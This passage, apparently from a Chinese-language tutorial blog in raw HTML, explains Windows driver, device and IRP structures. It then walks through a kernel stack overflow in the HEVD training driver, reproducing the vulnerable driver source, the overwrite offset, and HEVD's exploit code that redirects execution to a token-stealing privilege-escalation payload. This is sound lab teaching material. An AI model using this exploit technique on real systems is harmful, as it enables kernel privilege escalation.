class="line">      UNICODE_STRING DriverName;  </span><br><span class="line">  ……  </span><br><span class="line">  <span class="comment">//  快速 IO分发函数  </span></span><br><span class="line">      PFAST_IO_DISPATCH FastIoDispatch;  </span><br><span class="line">   ……  </span><br><span class="line"> <span class="comment">//  驱动的卸载函数  </span></span><br><span class="line">      PDRIVER_UNLOAD DriverUnload;  </span><br><span class="line">  <span class="comment">//  普通分发函数  </span></span><br><span class="line">    PDRIVER_DISPATCH MajorFunction[IRP_MJ_MAXIMUM_FUNCTION + <span class="number">1</span>];  </span><br><span class="line">&#125; DRIVER_OBJECT;</span><br></pre></td></tr></table></figure><p>设备对象可以类比为 Windows GUI 编程中的窗口，所有 I/O 请求都需要通过设备对象来处理。然而，不同于 GUI 窗口通常由特定进程管理，设备对象可以被多个进程访问，并且它们之间可以通过 IRP 进行交互。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title function_">DECLSPEC_ALIGN</span><span class="params">(MEMORY_ALLOCATION_ALIGNMENT)</span> _DEVICE_OBJECT  </span><br><span class="line">&#123;</span><br><span class="line">  CSHORT Type;  </span><br><span class="line">  USHORT Size;     </span><br><span class="line">  <span class="comment">//  引用计数，当引用计数为0的时候此对象被销毁  </span></span><br><span class="line">  ULONG ReferenceCount;     </span><br><span class="line">  <span class="comment">//  这个设备所属的驱动对象  </span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">DRIVER_OBJECT</span> *<span class="title">DriverObject</span>;</span>  </span><br><span class="line">  <span class="comment">//  下一个设备对象。在一个驱动对象中有n 个设备，这些设备用这个指针连接  </span></span><br><span class="line">  <span class="comment">//  起来作为一个单向的链表。  </span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">DEVICE_OBJECT</span> *<span class="title">NextDevice</span>;</span>   </span><br><span class="line">  <span class="comment">//  设备类型  </span></span><br><span class="line">  DEVICE_TYPE DeviceType;     </span><br><span class="line">  <span class="comment">// IRP栈大小  </span></span><br><span class="line">  HAR StackSize;       </span><br><span class="line">  ……  </span><br><span class="line">&#125;DEVICE_OBJECT;</span><br></pre></td></tr></table></figure><p><strong>设备</strong> 是硬件或虚拟实体的抽象表示，由设备对象表示</p><p><strong>驱动程序</strong> 是操作系统与设备之间的桥梁，负责管理和控制设备的行为,与设备是一对多的关系</p><h2 id="IRP"><a href="#IRP" class="headerlink" title="IRP"></a>IRP</h2><p>IRP（I/O Request Packet）是 Windows 内核用于描述 I/O 请求的核心数据结构。I/O 管理器在用户态和内核态之间传递 I/O 请求时，会创建 IRP 并将其发送到设备栈的顶层驱动程序，由驱动层层处理，直到请求完成。</p><p>驱动与驱动之间，驱动与用户层之间都是直接或者间接通过IRP进行通讯的。</p><p>IRP具体由两部分组成：头部区域和I/O堆栈（IO_STACK_LOCATIONS）。</p><p>头部区域是一个_IRP结构。I/O堆栈则是一个IO_STACK_LOCATIONS的结构体数组，这个数组的大小由IoAllocateIrp创建IRP时所决定。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-15_105938.png" alt=""></p><p>驱动对象会创建一个又一个的设备对象，这些设备对象通过链表的数据结构堆叠成一个垂直的结构，这个结构被称为设备栈。</p><p>IRP 会被操作系统送到设备栈的顶层设备对象，由对应的驱动程序处理。驱动可以选择完成请求、将请求向下传递给下层驱动，或在某些情况下将其返回给上层驱动（例如筛选驱动会修改并重新提交 IRP）。</p><p>不同的IRP数据会按照类型传递到不同的派遣函数中。常见有5种IRP结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_CREATE 0X00 <span class="comment">//对应用户层函数CreateFile()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_CLOSE  0X02 <span class="comment">//对应用户层函数CloseHandle()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_READ 0X03 <span class="comment">//对应用户层函数ReadFile()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_WRITE 0X04 <span class="comment">//对应用户层函数WirteFile()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_DEVICE_CONTROL 0X0e <span class="comment">//DeviceIoControl()</span></span></span><br></pre></td></tr></table></figure><p>看其定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IRP</span> &#123;</span></span><br><span class="line">    PMDL              MdlAddress;</span><br><span class="line">    ULONG             Flags;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">IRP</span>*   <span class="title">MasterIrp</span>;</span></span><br><span class="line">        PVOID          SystemBuffer;</span><br><span class="line">    &#125; AssociatedIrp;</span><br><span class="line">    IO_STATUS_BLOCK   IoStatus;</span><br><span class="line">    KPROCESSOR_MODE   RequestorMode;</span><br><span class="line">    BOOLEAN           PendingReturned;</span><br><span class="line">    BOOLEAN           Cancel;</span><br><span class="line">    KIRQL             CancelIrql;</span><br><span class="line">    PDRIVER_CANCEL    CancelRoutine;</span><br><span class="line">    PVOID             UserBuffer;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">                KDEVICE_QUEUE_ENTRY DeviceQueueEntry;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">                    PVOID    DriverContext[<span class="number">4</span>];</span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;;</span><br><span class="line">            PETHREAD     Thread;</span><br><span class="line">            LIST_ENTRY   ListEntry;</span><br><span class="line">        &#125; Overlay;</span><br><span class="line">    &#125; Tail;</span><br><span class="line">&#125; IRP, *PIRP;</span><br></pre></td></tr></table></figure><p>IRP有三个描述缓冲区的位置,对应Windows 内核提供三种不同的 I/O 传递方式：</p><ul><li><strong>缓冲 I/O</strong>（Buffered I/O）：I/O 管理器会分配非分页池，并将用户模式缓冲区的数据复制到 <code>SystemBuffer</code>。</li><li><strong>直接 I/O</strong>（Direct I/O）：I/O 管理器使用 MDL（内存描述列表）映射用户缓冲区，驱动通过 <code>MdlAddress</code> 访问数据，而不会复制数据。</li><li><strong>无缓冲 I/O</strong>（Neither I/O）：I/O 管理器不会提供缓冲区，驱动直接使用 <code>UserBuffer</code> 访问用户模式内存，但需要特别小心处理，以避免访问非法地址。</li></ul><p>接下来再看十分重要的一个结构<code>IRPsp</code>,其结构类型是<code>IO_STACK_LOCATION</code>,它是 Windows 内核中与 <strong>IRP</strong>（I/O Request Packet）密切相关的数据结构，用于存储与当前 I/O 请求相关的信息。每个 IRP 都包含一个或多个 <code>IO_STACK_LOCATION</code> 结构，这些结构构成了一个堆栈，用于在设备栈中传递 I/O 请求，每个设备对象都会处理对应的 <code>IO_STACK_LOCATION</code></p><p>为什么有了IRP还需要IRPsp,因为IRP实际上只是相当于一个头部结构,用来描述整个请求,至于更细节的信息则需要其他的结构负责</p><p>可以如下获取IRP对应的IRPsp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);</span><br></pre></td></tr></table></figure><p><code>IO_STACK_LOCATION</code>的定义十分长,可以在<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ns-wdm-_io_stack_location">IO_STACK_LOCATION （wdm.h） - Windows drivers | Microsoft Learn</a>查看完整的定义</p><p>这里只介绍一些关键字段</p><ol><li><strong><code>MajorFunction</code></strong>:表示当前 I/O 请求的主功能代码。常见的值包括：<ul><li><code>IRP_MJ_CREATE</code>：打开设备或文件。</li><li><code>IRP_MJ_READ</code>：读取数据。</li><li><code>IRP_MJ_WRITE</code>：写入数据。</li><li><code>IRP_MJ_DEVICE_CONTROL</code>：设备控制请求（IOCTL）。</li><li><code>IRP_MJ_CLOSE</code>：关闭设备或文件。</li></ul></li><li><strong><code>MinorFunction</code></strong>:表示当前 I/O 请求的次功能代码。通常用于扩展主功能代码的行为。</li><li><strong><code>Parameters</code></strong>:一个联合体（union），根据 <code>MajorFunction</code> 的不同，存储与 I/O 请求相关的参数。例如：<ul><li>对于 <code>IRP_MJ_READ</code>，存储读取的长度、偏移量等信息。</li><li>对于 <code>IRP_MJ_DEVICE_CONTROL</code>，存储 IOCTL 控制代码、输入/输出缓冲区长度等信息。</li></ul></li><li><strong><code>DeviceObject</code></strong>:指向当前设备对象的指针。</li><li><strong><code>FileObject</code></strong>:指向与当前 I/O 请求相关的文件对象的指针</li></ol><h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><p>接下来看最简单的一个案例,在几乎没有检查和保护的情况下完成一次内核栈溢出利用</p><p>漏洞源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;BufferOverflowStack.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ALLOC_PRAGMA</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> alloc_text(PAGE, TriggerBufferOverflowStack)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> alloc_text(PAGE, BufferOverflowStackIoctlHandler)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// ALLOC_PRAGMA</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Trigger the buffer overflow in Stack Vulnerability</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;UserBuffer&quot;&gt;The pointer to user mode buffer&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;Size&quot;&gt;Size of the user mode buffer&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;NTSTATUS&lt;/returns&gt;</span></span><br><span class="line">__declspec(safebuffers)</span><br><span class="line">NTSTATUS</span><br><span class="line"><span class="title function_">TriggerBufferOverflowStack</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PVOID UserBuffer,</span></span><br><span class="line"><span class="params">    _In_ SIZE_T Size</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">    NTSTATUS Status = STATUS_SUCCESS;</span><br><span class="line">    ULONG KernelBuffer[BUFFER_SIZE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    PAGED_CODE();</span><br><span class="line"></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Verify if the buffer resides in user mode</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        ProbeForRead(UserBuffer, <span class="keyword">sizeof</span>(KernelBuffer), (ULONG)__alignof(UCHAR));</span><br><span class="line"></span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] UserBuffer: 0x%p\n&quot;</span>, UserBuffer);</span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] UserBuffer Size: 0x%zX\n&quot;</span>, Size);</span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] KernelBuffer: 0x%p\n&quot;</span>, &amp;KernelBuffer);</span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] KernelBuffer Size: 0x%zX\n&quot;</span>, <span class="keyword">sizeof</span>(KernelBuffer));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SECURE</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Secure Note: This is secure because the developer is passing a size</span></span><br><span class="line">        <span class="comment">// equal to size of KernelBuffer to RtlCopyMemory()/memcpy(). Hence,</span></span><br><span class="line">        <span class="comment">// there will be no overflow</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, <span class="keyword">sizeof</span>(KernelBuffer));</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] Triggering Buffer Overflow in Stack\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Vulnerability Note: This is a vanilla Stack based Overflow vulnerability</span></span><br><span class="line">        <span class="comment">// because the developer is passing the user supplied size directly to</span></span><br><span class="line">        <span class="comment">// RtlCopyMemory()/memcpy() without validating if the size is greater or</span></span><br><span class="line">        <span class="comment">// equal to the size of KernelBuffer</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line">        Status = GetExceptionCode();</span><br><span class="line">        DbgPrint(<span class="string">&quot;[-] Exception Code: 0x%X\n&quot;</span>, Status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Buffer Overflow Stack Ioctl Handler</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;Irp&quot;&gt;The pointer to IRP&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;IrpSp&quot;&gt;The pointer to IO_STACK_LOCATION structure&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;NTSTATUS&lt;/returns&gt;</span></span><br><span class="line">NTSTATUS</span><br><span class="line"><span class="title function_">BufferOverflowStackIoctlHandler</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PIRP Irp,</span></span><br><span class="line"><span class="params">    _In_ PIO_STACK_LOCATION IrpSp</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">    SIZE_T Size = <span class="number">0</span>;</span><br><span class="line">    PVOID UserBuffer = <span class="literal">NULL</span>;</span><br><span class="line">    NTSTATUS Status = STATUS_UNSUCCESSFUL;</span><br><span class="line"></span><br><span class="line">    UNREFERENCED_PARAMETER(Irp);</span><br><span class="line">    PAGED_CODE();</span><br><span class="line"></span><br><span class="line">    UserBuffer = IrpSp-&gt;Parameters.DeviceIoControl.Type3InputBuffer;</span><br><span class="line">    Size = IrpSp-&gt;Parameters.DeviceIoControl.InputBufferLength;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (UserBuffer)</span><br><span class="line">    &#123;</span><br><span class="line">        Status = TriggerBufferOverflowStack(UserBuffer, Size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>UNREFERENCED_PARAMETER</code>用于告诉编译器,这个参数没有使用是有意为之,不要发出警告</p><p><code>PAGED_CODE</code>用于标记代码运行在分页内存中</p><p><code>ProbeForRead</code>是windows内核编程用于验证用户模式提供的缓冲区是否可读</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">ProbeForRead</span><span class="params">(</span></span><br><span class="line"><span class="params">  _In_ <span class="type">const</span> <span class="keyword">volatile</span> VOID *Address,</span></span><br><span class="line"><span class="params">  _In_ SIZE_T              Length,</span></span><br><span class="line"><span class="params">  _In_ ULONG               Alignment</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p><code>RtlCopyMemory</code> 是 Windows 内核模式编程中的一个函数，用于将数据从源内存区域复制到目标内存区域,相当于用户态的<code>memcpy</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">RtlCopyMemory</span><span class="params">(</span></span><br><span class="line"><span class="params">  _Out_       <span class="type">void</span>*       Destination,</span></span><br><span class="line"><span class="params">  _In_  <span class="type">const</span> <span class="type">void</span>*       Source,</span></span><br><span class="line"><span class="params">  _In_        SIZE_T      Length</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>这个漏洞还是很明显的,内核从用户态读取内存但是长度却由用户指定,于是存在栈溢出</p><p>用ida看一下kernelbuffer的缓冲区长度</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-15_144444.png" alt=""></p><p>kernelbuffer到覆盖eip需要<code>0x81C+4</code>个字节</p><p>是的,就是这么一个在用户态下最基本的漏洞现在出现在内核中</p><p>那么看HEVD给出的exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;StackOverflow.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">StackOverflowThread</span><span class="params">(LPVOID Parameter)</span> &#123;</span><br><span class="line">    HANDLE hFile = <span class="literal">NULL</span>;</span><br><span class="line">    ULONG BytesReturned;</span><br><span class="line">    PVOID MemoryAddress = <span class="literal">NULL</span>;</span><br><span class="line">    PULONG UserModeBuffer = <span class="literal">NULL</span>;</span><br><span class="line">    LPCSTR FileName = (LPCSTR)DEVICE_NAME;</span><br><span class="line">    PVOID EopPayload = &amp;TokenStealingPayloadWin7;</span><br><span class="line">    SIZE_T UserModeBufferSize = (BUFFER_SIZE + RET_OVERWRITE) * <span class="keyword">sizeof</span>(ULONG);</span><br><span class="line"></span><br><span class="line">    __try &#123;</span><br><span class="line">        <span class="comment">// Get the device handle</span></span><br><span class="line">        DEBUG_MESSAGE(<span class="string">&quot;\t[+] Getting Device Driver Handle\n&quot;</span>);</span><br><span class="line">        DEBUG_INFO(<span class="string">&quot;\t\t[+] Device Name: %s\n&quot;</span>, FileName);</span><br><span class="line"></span><br><span class="line">        hFile = GetDeviceHandle(FileName);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">            DEBUG_ERROR(<span class="string">&quot;\t\t[-] Failed Getting Device Handle: 0x%X\n&quot;</span>, GetLastError());</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            DEBUG_INFO(<span class="string">&quot;\t\t[+] Device Handle: 0x%X\n&quot;</span>, hFile);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        DEBUG_MESSAGE(<span class="string">&quot;\t[+] Setting Up Vulnerability Stage\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        DEBUG_INFO(<span class="string">&quot;\t\t[+] Allocating Memory For Buffer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        UserModeBuffer = (PULONG)HeapAlloc(GetProcessHeap(),</span><br><span class="line">                                           HEAP_ZERO_MEMORY,</span><br><span class="line">                                           UserModeBufferSize);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!UserModeBuffer) &#123;</span><br><span class="line">            DEBUG_ERROR(<span class="string">&quot;\t\t\t[-] Failed To Allocate Memory: 0x%X\n&quot;</span>, GetLastError());</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            DEBUG_INFO(<span class="string">&quot;\t\t\t[+] Memory Allocated: 0x%p\n&quot;</span>, UserModeBuffer);</span><br><span class="line">            DEBUG_INFO(<span class="string">&quot;\t\t\t[+] Allocation Size: 0x%X\n&quot;</span>, UserModeBufferSize);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        DEBUG_INFO(<span class="string">&quot;\t\t[+] Preparing Buffer Memory Layout\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        RtlFillMemory((PVOID)UserModeBuffer, UserModeBufferSize, <span class="number">0x41</span>);</span><br><span class="line"></span><br><span class="line">        MemoryAddress = (PVOID)(((ULONG)UserModeBuffer + UserModeBufferSize) - <span class="keyword">sizeof</span>(ULONG));</span><br><span class="line">        *(PULONG)MemoryAddress = (ULONG)EopPayload;</span><br><span class="line"></span><br><span class="line">        DEBUG_INFO(<span class="string">&quot;\t\t\t[+] RET Value: 0x%p\n&quot;</span>, *(PULONG)MemoryAddress);</span><br><span class="line">        DEBUG_INFO(<span class="string">&quot;\t\t\t[+] RET Address: 0x%p\n&quot;</span>, MemoryAddress);</span><br><span class="line"></span><br><span class="line">        DEBUG_INFO(<span class="string">&quot;\t\t[+] EoP Payload: 0x%p\n&quot;</span>, EopPayload);</span><br><span class="line"></span><br><span class="line">        DEBUG_MESSAGE(<span class="string">&quot;\t[+] Triggering Kernel Stack Overflow\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        OutputDebugString(<span class="string">&quot;****************Kernel Mode****************\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        DeviceIoControl(hFile,</span><br><span class="line">                        HACKSYS_EVD_IOCTL_STACK_OVERFLOW,</span><br><span class="line">                        (LPVOID)UserModeBuffer,</span><br><span class="line">                        (DWORD)UserModeBufferSize,</span><br><span class="line">                        <span class="literal">NULL</span>,</span><br><span class="line">                        <span class="number">0</span>,</span><br><span class="line">                        &amp;BytesReturned,</span><br><span class="line">                        <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        OutputDebugString(<span class="string">&quot;****************Kernel Mode****************\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HeapFree(GetProcessHeap(), <span class="number">0</span>, (LPVOID)UserModeBuffer);</span><br><span class="line"></span><br><span class="line">        UserModeBuffer = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER) &#123;</span><br><span class="line">        DEBUG_ERROR(<span class="string">&quot;\t\t[-] Exception: 0x%X\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与Linux下的内核利用相同,首先我们要做的就是获取这个设备的句柄</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_NAME <span class="string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span></span></span><br><span class="line"></span><br><span class="line">HANDLE <span class="title function_">GetDeviceHandle</span><span class="params">(LPCSTR FileName)</span> &#123;</span><br><span class="line">    HANDLE hFile = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    hFile = CreateFile(FileName,</span><br><span class="line">                       GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">                       FILE_SHARE_READ | FILE_SHARE_WRITE,</span><br><span class="line">                       <span class="literal">NULL</span>,</span><br><span class="line">                       OPEN_EXISTING,</span><br><span class="line">                       FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,</span><br><span class="line">                       <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> hFile;</span><br><span 